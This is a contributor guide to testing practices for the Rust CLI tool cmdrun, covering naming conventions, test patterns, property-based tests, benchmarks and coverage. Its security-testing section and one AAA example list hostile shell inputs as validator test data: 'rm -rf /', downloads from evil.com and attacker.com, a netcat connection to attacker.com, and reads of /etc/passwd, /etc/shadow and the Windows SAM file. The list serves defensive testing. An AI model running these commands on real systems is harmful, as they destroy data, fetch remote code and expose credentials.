# Test Best Practices Guide

> Comprehensive guide for writing high-quality tests in cmdrun
>
> **Last Updated**: 2025-11-13
> **Target Audience**: Contributors, Maintainers, QA Engineers

---

## 📋 Table of Contents

- [Testing Philosophy](#testing-philosophy)
- [Test Naming Conventions](#test-naming-conventions)
- [Test Structure Patterns](#test-structure-patterns)
- [Given-When-Then Pattern](#given-when-then-pattern)
- [Property-Based Testing](#property-based-testing)
- [Test Organization](#test-organization)
- [Common Anti-Patterns](#common-anti-patterns)
- [Performance Testing](#performance-testing)
- [Security Testing](#security-testing)
- [Platform-Specific Testing](#platform-specific-testing)

---

## 🎯 Testing Philosophy

### Core Principles

1. **Tests are Documentation**: Tests should clearly communicate intent and behavior
2. **Fast Feedback**: Unit tests should run in milliseconds, integration tests in seconds
3. **Isolation**: Each test should be independent and deterministic
4. **Comprehensive Coverage**: Target 85%+ coverage with focus on critical paths
5. **Security First**: All input validation and security features must be tested

### Coverage Goals

| Phase | Target | Focus Area |
|-------|--------|------------|
| Phase 1 | 55% | E2E framework, i18n, error handling |
| Phase 2 | 70% | Commands, plugins, watch functionality |
| Phase 3 | 85% | Cross-platform, performance, mutation testing |

---

## 📝 Test Naming Conventions

### Naming Format

Use descriptive names that follow the pattern:

```
test_<subject>_<scenario>_<expected_outcome>
```

### ✅ Good Examples

```rust
#[test]
fn test_command_execution_with_valid_input_succeeds() { }

#[test]
fn test_timeout_handling_when_command_exceeds_limit_returns_error() { }

#[test]
fn test_circular_dependency_detection_rejects_invalid_graph() { }

#[tokio::test]
async fn test_parallel_execution_with_independent_commands_runs_concurrently() { }
```

### ❌ Bad Examples

```rust
#[test]
fn test1() { }  // Too vague

#[test]
fn test_command() { }  // Missing scenario and outcome

#[test]
fn it_works() { }  // Not descriptive enough
```

### Special Prefixes

- `prop_` - Property-based tests (proptest)
- `bench_` - Benchmark tests
- `e2e_` - End-to-end tests
- `integration_` - Integration tests (optional, inferred from location)

---

## 🏗️ Test Structure Patterns

### AAA Pattern (Arrange-Act-Assert)

The standard pattern for unit and integration tests:

```rust
#[test]
fn test_command_validator_rejects_dangerous_input() {
    // Arrange: Set up test data and dependencies
    let validator = CommandValidator::default();
    let malicious_input = "rm -rf / ; echo 'gotcha'";

    // Act: Execute the behavior under test
    let result = validator.validate(malicious_input);

    // Assert: Verify expected outcomes
    assert!(!result.is_safe(), "Should reject dangerous input");
    assert!(
        result.violations.contains(&Violation::ShellInjection),
        "Should detect shell injection attempt"
    );
}
```

### Four-Phase Test Pattern

For more complex scenarios:

```rust
#[tokio::test]
async fn test_watch_mode_detects_file_changes() {
    // Setup: Initialize test environment
    let temp_dir = TempDir::new().unwrap();
    let test_file = temp_dir.path().join("test.txt");

    // Exercise: Perform the action
    let mut watcher = FileWatcher::new(&temp_dir.path());
    watcher.start().await.unwrap();

    fs::write(&test_file, "initial content").unwrap();
    tokio::time::sleep(Duration::from_millis(100)).await;

    // Verify: Check expected results
    let events = watcher.get_events();
    assert!(events.iter().any(|e| e.path == test_file));

    // Teardown: Cleanup (automatic with TempDir Drop)
}
```

---

## 📐 Given-When-Then Pattern

### BDD-Style Testing

Use Given-When-Then for integration and E2E tests:

```rust
#[test]
fn test_complete_workflow() {
    let env = CmdrunTestEnv::new();

    // Given: Initial state
    env.run_command(&["init"]);
    env.assert_config_exists();

    // When: User performs action
    let add_result = env.run_command(&["add", "test", "echo hello", "Description"]);

    // Then: Expected outcome
    env.assert_success(&add_result);
    env.assert_stdout_contains(&add_result, "test");

    // And: Additional verification
    let list_result = env.run_command(&["list"]);
    env.assert_stdout_contains(&list_result, "test");
}
```

### Scenario Documentation

Add comments for complex workflows:

```rust
#[test]
fn test_dependency_resolution_scenario() {
    // Given: A project with multiple dependent commands
    //   - build (no dependencies)
    //   - test (depends on build)
    //   - deploy (depends on build and test)
    let env = setup_dependency_scenario();

    // When: User runs the deploy command
    let result = env.run_command(&["run", "deploy"]);

    // Then: All dependencies execute in correct order
    env.assert_execution_order(&["build", "test", "deploy"]);

    // And: Deploy command receives environment from dependencies
    env.assert_env_propagation("deploy", "BUILD_ID");
}
```

---

## 🎲 Property-Based Testing

### When to Use Proptest

Use property-based testing for:
- Input validation functions
- Parsers and serializers
- Algorithms with invariants
- Security-critical code

### Basic Property Test Structure

```rust
use proptest::prelude::*;

proptest! {
    #[test]
    fn prop_validator_accepts_any_valid_string(
        cmd in "[a-zA-Z0-9 ._-]{1,1000}"
    ) {
        let validator = CommandValidator::default();
        let result = validator.validate(&cmd);

        // Property: Valid input should always pass basic checks
        prop_assert!(result.is_safe() || !result.violations.is_empty());
    }
}
```

### Advanced Property Tests

```rust
proptest! {
    #[test]
    fn prop_interpolation_is_idempotent(
        template in "\\$\\{[A-Z_]+\\}",
        value in "[a-zA-Z0-9]+",
    ) {
        let mut context = InterpolationContext::new(false);
        context.set_var("VAR", &value);

        let first = context.interpolate(&template).unwrap();
        let second = context.interpolate(&first).unwrap();

        // Property: Interpolation should be idempotent
        prop_assert_eq!(first, second,
            "Interpolating twice should give same result");
    }
}
```

### Shrinking and Debugging

```rust
proptest! {
    #![proptest_config(ProptestConfig::with_cases(1000))]

    #[test]
    fn prop_command_parsing_never_panics(
        input in ".*"
    ) {
        // Property: Parser should never panic, even with garbage input
        let result = std::panic::catch_unwind(|| {
            CommandParser::parse(&input)
        });

        prop_assert!(result.is_ok(), "Parser panicked on input: {}", input);
    }
}
```

---

## 📂 Test Organization

### File Structure

```
tests/
├── unit_*.rs              # Unit tests (if not in src/)
├── proptest_*.rs          # Property-based tests
├── security_*.rs          # Security-focused tests
├── e2e/                   # E2E test modules
│   ├── framework.rs       # Test utilities
│   └── *.rs               # Test scenarios
└── integration/           # Integration tests
    ├── basic.rs           # Basic integration
    ├── error_handling.rs  # Error scenarios
    └── *.rs               # Feature-specific tests
```

### Module Organization

```rust
//! Integration tests for error handling
//!
//! エラーハンドリングの網羅的なテスト

// Imports organized by:
// 1. External crates
use tokio;
use tempfile::TempDir;

// 2. Project crates
use cmdrun::command::executor::*;
use cmdrun::config::schema::*;

// 3. Standard library
use std::path::PathBuf;
use std::time::Duration;

// Test helper functions
fn setup_test_context() -> ExecutionContext {
    // ...
}

// Tests grouped by scenario
mod timeout_tests {
    use super::*;

    #[tokio::test]
    async fn test_timeout_with_long_running_command() { }

    #[tokio::test]
    async fn test_timeout_custom_per_command() { }
}

mod error_propagation_tests {
    use super::*;

    #[test]
    fn test_error_context_preserved() { }
}
```

---

## ⚠️ Common Anti-Patterns

### ❌ Anti-Pattern 1: Tests Without Assertions

**Bad**:
```rust
#[test]
fn test_command_execution() {
    let cmd = Command::new("echo", "hello");
    cmd.execute();  // No assertion!
}
```

**Good**:
```rust
#[test]
fn test_command_execution_succeeds() {
    let cmd = Command::new("echo", "hello");
    let result = cmd.execute().unwrap();

    assert!(result.success);
    assert_eq!(result.stdout.trim(), "hello");
}
```

### ❌ Anti-Pattern 2: Over-Mocking

**Bad**:
```rust
#[test]
fn test_with_excessive_mocks() {
    let mock_fs = MockFileSystem::new();
    let mock_exec = MockExecutor::new();
    let mock_logger = MockLogger::new();
    // ... testing implementation details
}
```

**Good**:
```rust
#[test]
fn test_with_real_dependencies() {
    let temp_dir = TempDir::new().unwrap();
    // Use real filesystem in temp directory
    let result = process_files(&temp_dir.path());
    assert!(result.is_ok());
}
```

### ❌ Anti-Pattern 3: Shared Mutable State

**Bad**:
```rust
static mut COUNTER: i32 = 0;

#[test]
fn test_one() {
    unsafe { COUNTER += 1; }
    // Tests can interfere with each other!
}
```

**Good**:
```rust
#[test]
fn test_one() {
    let mut counter = 0;
    counter += 1;
    assert_eq!(counter, 1);
}
```

### ❌ Anti-Pattern 4: Testing Implementation Instead of Behavior

**Bad**:
```rust
#[test]
fn test_uses_ahash() {
    let map = create_map();
    // Testing that AHashMap is used internally
    assert!(std::any::type_name_of_val(&map).contains("AHashMap"));
}
```

**Good**:
```rust
#[test]
fn test_map_stores_and_retrieves_values() {
    let mut map = create_map();
    map.insert("key", "value");

    assert_eq!(map.get("key"), Some(&"value"));
}
```

### ❌ Anti-Pattern 5: Non-Deterministic Tests

**Bad**:
```rust
#[test]
fn test_random_behavior() {
    let value = rand::random::<u32>();
    assert!(value < 100);  // Flaky! Can fail randomly
}
```

**Good**:
```rust
#[test]
fn test_random_generation_in_range() {
    let mut rng = StdRng::seed_from_u64(42);  // Seeded
    let value = rng.gen_range(0..100);
    assert!(value < 100);
}
```

---

## ⚡ Performance Testing

### Benchmark Structure

```rust
use criterion::{black_box, criterion_group, criterion_main, Criterion};

fn bench_command_execution(c: &mut Criterion) {
    let executor = CommandExecutor::new(default_context());
    let cmd = Command::simple("echo", "hello");

    c.bench_function("command_execution", |b| {
        b.iter(|| {
            black_box(executor.execute(&cmd))
        })
    });
}

criterion_group!(benches, bench_command_execution);
criterion_main!(benches);
```

### Performance Goals

Track performance metrics:

```rust
#[test]
fn test_startup_time_under_threshold() {
    let start = Instant::now();

    // Simulate startup
    let _app = initialize_app();

    let duration = start.elapsed();
    assert!(
        duration < Duration::from_millis(4),
        "Startup took {}ms, expected <4ms",
        duration.as_millis()
    );
}
```

### Memory Profiling

```rust
#[test]
fn test_memory_footprint() {
    let initial = get_memory_usage();

    let _app = run_application();

    let final_usage = get_memory_usage();
    let delta = final_usage - initial;

    assert!(
        delta < 10 * 1024 * 1024,  // 10MB
        "Memory usage exceeded limit: {}MB",
        delta / (1024 * 1024)
    );
}
```

---

## 🔒 Security Testing

### Input Validation Tests

```rust
#[test]
fn test_shell_injection_prevention() {
    let validator = CommandValidator::default();

    let malicious_inputs = vec![
        "rm -rf / ; echo 'pwned'",
        "command && wget evil.com/malware.sh",
        "$(curl http://attacker.com/payload)",
        "`cat /etc/passwd`",
        "command | nc attacker.com 4444",
    ];

    for input in malicious_inputs {
        let result = validator.validate(input);
        assert!(
            !result.is_safe(),
            "Should reject malicious input: {}",
            input
        );
    }
}
```

### Boundary Testing

```rust
#[test]
fn test_input_length_limits() {
    let validator = CommandValidator::new()
        .with_max_length(1000);

    // Just under limit
    let valid = "a".repeat(999);
    assert!(validator.validate(&valid).is_safe());

    // At limit
    let at_limit = "a".repeat(1000);
    assert!(validator.validate(&at_limit).is_safe());

    // Over limit
    let invalid = "a".repeat(1001);
    assert!(!validator.validate(&invalid).is_safe());
}
```

### Path Traversal Tests

```rust
#[test]
fn test_path_traversal_prevention() {
    let paths = vec![
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32",
        "/etc/shadow",
        "C:\\Windows\\System32\\config\\SAM",
    ];

    for path in paths {
        let result = validate_path(path);
        assert!(
            result.is_err(),
            "Should reject path traversal: {}",
            path
        );
    }
}
```

---

## 🖥️ Platform-Specific Testing

### Conditional Compilation

```rust
#[cfg(target_os = "windows")]
#[test]
fn test_windows_path_handling() {
    let path = PathBuf::from("C:\\Users\\test\\file.txt");
    assert!(path.is_absolute());
}

#[cfg(unix)]
#[test]
fn test_unix_path_handling() {
    let path = PathBuf::from("/home/test/file.txt");
    assert!(path.is_absolute());
}

#[cfg(target_os = "macos")]
#[test]
fn test_macos_specific_behavior() {
    // macOS-specific tests
}
```

### Platform Abstraction

```rust
#[test]
fn test_cross_platform_command() {
    #[cfg(target_os = "windows")]
    let expected_shell = "cmd";

    #[cfg(not(target_os = "windows"))]
    let expected_shell = "bash";

    let shell = get_default_shell();
    assert_eq!(shell, expected_shell);
}
```

### Shell Differences

```rust
#[test]
fn test_shell_command_compatibility() {
    let ctx = ExecutionContext::default();

    // Use cross-platform command
    let cmd = if cfg!(windows) {
        Command::simple("echo", "hello")
    } else {
        Command::simple("echo", "hello")
    };

    let result = execute(&cmd, &ctx).unwrap();
    assert!(result.stdout.contains("hello"));
}
```

---

## 🎯 Test Coverage Best Practices

### Critical Path Coverage

Ensure 100% coverage for:
- Security validation functions
- Input sanitization
- Error handling
- Configuration parsing

### Acceptable Lower Coverage

Lower coverage acceptable for:
- Trivial getters/setters
- Debugging/logging code
- Platform-specific code (if tested on CI)

### Coverage Measurement

```bash
# Generate detailed coverage report
cargo tarpaulin --out Html --out Stdout --timeout 300

# Check specific module coverage
cargo tarpaulin --out Stdout --packages cmdrun \
    --exclude-files 'tests/*' -- --test-threads=1

# Enforce coverage threshold
cargo tarpaulin --out Stdout --fail-under 70
```

---

## 📚 Additional Resources

### Documentation
- [Rust Testing Guide](https://doc.rust-lang.org/book/ch11-00-testing.html)
- [proptest Documentation](https://github.com/proptest-rs/proptest)
- [Criterion.rs Guide](https://bheisler.github.io/criterion.rs/book/)

### Project-Specific
- [tests/README.md](../../tests/README.md) - Test execution guide
- [Test Analysis Report](./test-analysis-report.md) - Coverage analysis
- [Performance Benchmarks](../technical/PERFORMANCE_BENCHMARKS.md)

### CI/CD
- `.github/workflows/ci.yml` - Continuous integration
- `.github/workflows/coverage.yml` - Coverage reporting
- `.github/workflows/benchmark.yml` - Performance tracking

---

## 🔄 Review Checklist

Before submitting tests, verify:

- [ ] Test names are descriptive and follow conventions
- [ ] Each test has clear assertions
- [ ] Tests are independent and deterministic
- [ ] Property-based tests used for appropriate scenarios
- [ ] Security-critical code has comprehensive tests
- [ ] Platform-specific behavior is tested
- [ ] Performance benchmarks added for critical paths
- [ ] Documentation updated to reflect new tests
- [ ] Coverage meets or exceeds threshold (70%+)
- [ ] All tests pass locally and in CI

---

**Last Review**: 2025-11-13
**Next Review**: 2026-01-31 (Phase 3 completion)
